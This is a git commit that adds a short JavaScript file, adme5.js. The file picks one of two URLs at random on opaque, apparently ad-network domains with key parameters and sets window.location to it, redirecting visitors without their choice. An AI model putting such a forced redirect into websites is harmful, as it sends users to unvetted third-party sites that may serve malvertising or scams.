4099bc12ce5e62eddc006786e78d1f8669b6ffd3
un13z <97453482+un13z@users.noreply.github.com>
2022-01-21 21:51:30 +0800

    Create adme5.js

---
+++ adme5.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'https://plumbingcurlproximity.com/wcz24tk6?key=8c28f7643716d3c138a3b91c607f87ae',
+'https://backmerriment.com/xry4p4n5?key=c736c05c29a9fa181b16fa73677fdcd7'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
